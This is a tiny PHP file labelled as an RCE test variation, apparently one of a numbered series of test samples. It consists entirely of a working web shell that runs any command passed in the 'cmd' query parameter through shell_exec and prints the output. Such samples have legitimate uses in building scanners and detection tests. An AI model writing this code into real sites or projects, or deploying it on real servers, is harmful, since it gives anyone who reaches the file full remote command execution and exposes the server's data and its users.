<?php
// RCE test variation #921
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>